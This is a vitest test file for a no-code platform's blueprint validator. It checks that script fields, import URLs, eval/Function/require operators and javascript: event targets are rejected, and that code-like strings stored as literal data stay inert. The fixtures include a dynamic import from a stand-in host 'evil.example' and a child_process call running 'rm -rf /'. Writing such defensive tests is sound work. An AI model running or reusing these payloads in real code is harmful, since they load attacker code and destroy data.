import { describe, expect, test } from "vitest";

import { VALIDATOR_REGISTRY } from "../../generated/capabilities/validator-registry.js";
import { validateBlueprintCandidate } from "../../src/platform/blueprint/validate-blueprint.js";
import { generateRegistryArtifacts, RegistryGenerationError } from "../../src/platform/capabilities/generate-registry.js";
import { CAPABILITY_REGISTRY_SOURCE } from "../../src/platform/capabilities/registry.js";
import type { GeneratedCapabilityValidator, ValidatorRegistry } from "../../src/platform/capabilities/schema/validator-contract.js";
import {
  encode,
  issueOf,
  mutate,
  nodeIndex,
  source,
  validBlueprint,
  withValue,
  type JsonRecord
} from "../contract/blueprint-validation-fixtures.js";

const { lit, op } = source;
const CODE_LIKE = "eval(alert(1)); import('https://evil.example/x.js'); new Function('return 1')(); function f() {}";
const TITLE = nodeIndex("node_title");

function withRule(expr: JsonRecord): JsonRecord {
  const candidate = validBlueprint();
  (candidate.rules as JsonRecord[]).push({ id: "rule_code", result_type: "NUMBER", expr });
  return candidate;
}

function executableCarriers(): readonly (readonly [string, JsonRecord, string, string, string])[] {
  return [
    ["top-level script", withValue(["script"], "alert(1)"), "F02-ERR-002", "V02", "$.script"],
    ["meta import_url", withValue(["meta", "import_url"], "https://evil.example/x.js"), "F02-ERR-002", "V02", "$.meta.import_url"],
    ["node handler path", withValue(["nodes", TITLE, "handler"], "./evil.js"), "F02-ERR-002", "V02", `$.nodes[${TITLE}].handler`],
    [
      "capability registrationKey",
      withValue(["nodes", TITLE, "capability", "registrationKey"], "content/text"),
      "F02-ERR-002",
      "V02",
      `$.nodes[${TITLE}].capability.registrationKey`
    ],
    ["module path as capability id", withValue(["nodes", TITLE, "capability", "id"], "https://evil.example/x.js"), "F02-ERR-002", "V02", `$.nodes[${TITLE}].capability.id`],
    ["function Value Source", withValue(["nodes", TITLE, "bindings", "text"], { kind: "FUNCTION", body: "return 1" }), "F02-ERR-002", "V02", `$.nodes[${TITLE}].bindings.text.kind`],
    ["dynamic import Value Source", withValue(["nodes", TITLE, "bindings", "text"], { kind: "IMPORT", url: "x.js" }), "F02-ERR-002", "V02", `$.nodes[${TITLE}].bindings.text.kind`],
    ["script action step", withValue(["actions", 0, "steps", 0], { type: "RUN_SCRIPT", code: "alert(1)" }), "F02-ERR-002", "V02", "$.actions[0].steps[0].type"],
    ["javascript event target", withValue(["nodes", nodeIndex("node_people"), "events", "change"], "javascript:alert(1)"), "F02-ERR-002", "V02", `$.nodes[${nodeIndex("node_people")}].events.change`],
    ["undeclared code prop", withValue(["nodes", TITLE, "props", "code"], lit("alert(1)")), "F02-ERR-005", "V04", `$.nodes[${TITLE}].props.code`],
    ["undeclared onClick binding", withValue(["nodes", TITLE, "bindings", "onClick"], lit("eval(x)")), "F02-ERR-005", "V04", `$.nodes[${TITLE}].bindings.onClick`]
  ];
}

function expectCarriersFailClosed(): void {
  for (const [label, candidate, code, stage, path] of executableCarriers()) {
    const result = validateBlueprintCandidate(encode(candidate));
    expect(result.report.status, label).toBe("REJECTED");
    expect(result.admissible, label).toBeUndefined();
    expect(issueOf(result), label).toEqual({ code, stage, path });
  }
  for (const operator of ["eval", "import", "Function", "require"]) {
    const result = validateBlueprintCandidate(encode(withRule(op(operator, lit("alert(1)")))));
    expect(result.report.status, operator).toBe("REJECTED");
    expect(result.admissible, operator).toBeUndefined();
    expect(issueOf(result), operator).toEqual({ code: "F02-ERR-009", stage: "V07", path: "$.rules[1].expr.op" });
  }
}

function inertCandidate(): JsonRecord {
  const candidate = withValue(["nodes", TITLE, "bindings", "text"], lit(CODE_LIKE));
  mutate(candidate, ["meta", "title"], (parent, key) => {
    (parent as JsonRecord)[key as string] = "function() { eval('x') }";
  });
  mutate(candidate, ["nodes", nodeIndex("node_note"), "props", "placeholder"], (parent, key) => {
    (parent as JsonRecord)[key as string] = lit("<script>import(\"https://evil.example/x.js\")</script>");
  });
  mutate(candidate, ["state", "note", "initial"], (parent, key) => {
    (parent as JsonRecord)[key as string] = "require('child_process').exec('rm -rf /')";
  });
  return candidate;
}

function expectCodeLikeDataStaysInert(): void {
  const result = validateBlueprintCandidate(encode(inertCandidate()));
  expect(result.report.status).toBe("PASSED");
  expect(result.report.issues).toEqual([]);
  const admitted = result.admissible;
  expect(admitted?.canonicalJson).toContain(JSON.stringify(CODE_LIKE));
  const titleNode = admitted?.blueprint.nodes[TITLE];
  expect(titleNode?.bindings.text).toEqual({ kind: "LITERAL", value: CODE_LIKE });
  expect(admitted?.blueprint.meta.title).toBe("function() { eval('x') }");
  for (const entry of admitted?.blueprint.nodes ?? []) {
    expect(Object.keys(entry.capability).sort()).toEqual(["id", "version"]);
  }
}

function registryWith(id: string, change: (entry: GeneratedCapabilityValidator) => GeneratedCapabilityValidator): ValidatorRegistry {
  const entry = VALIDATOR_REGISTRY.capabilities[id]!["1.0.0"]!;
  return { ...VALIDATOR_REGISTRY, capabilities: { ...VALIDATOR_REGISTRY.capabilities, [id]: { "1.0.0": change(entry) } } };
}

function expectPermissionPolicyAtV10(): void {
  const firstButton = `$.nodes[${nodeIndex("node_item_pick")}].capability`;
  const cases: readonly (readonly [string, ValidatorRegistry, string])[] = [
    ["USER_GESTURE media autoplay", registryWith("action.button", (entry) => ({ ...entry, resource_budget: { ...entry.resource_budget, mediaAutoplayAllowed: true } })), firstButton],
    ["network access", registryWith("action.button", (entry) => ({ ...entry, resource_budget: { ...entry.resource_budget, networkAccessAllowed: true } })), firstButton],
    ["browser permission", registryWith("content.text", (entry) => ({ ...entry, permission_class: "BROWSER_PERMISSION" })), `$.nodes[${TITLE}].capability`]
  ];
  for (const [label, registry, path] of cases) {
    const result = validateBlueprintCandidate(encode(validBlueprint()), { registry });
    expect(result.report.status, label).toBe("REJECTED");
    expect(result.admissible, label).toBeUndefined();
    expect(issueOf(result), label).toEqual({ code: "F02-ERR-012", stage: "V10", path });
  }
  for (const flag of ["mediaAutoplayAllowed", "networkAccessAllowed"] as const) {
    let code: string | undefined;
    try {
      generateRegistryArtifacts({
        ...CAPABILITY_REGISTRY_SOURCE,
        capabilities: CAPABILITY_REGISTRY_SOURCE.capabilities.map((definition) =>
          definition.id === "action.button"
            ? { ...definition, runtime: { ...definition.runtime, resourceBudget: { ...definition.runtime.resourceBudget, [flag]: true } } }
            : definition
        )
      });
    } catch (error: unknown) {
      code = error instanceof RegistryGenerationError ? error.code : "UNEXPECTED";
    }
    expect(code, flag).toBe("REGISTRY_GENERATION_INVALID");
  }
}

describe("F02 structural no-code admission", () => {
  test("TEST-F02-009 arbitrary JS, eval and dynamic import never become an executable path while code-like declared data stays inert", () => {
    expectCarriersFailClosed();
    expectCodeLikeDataStaysInert();
    expectPermissionPolicyAtV10();
  });
});
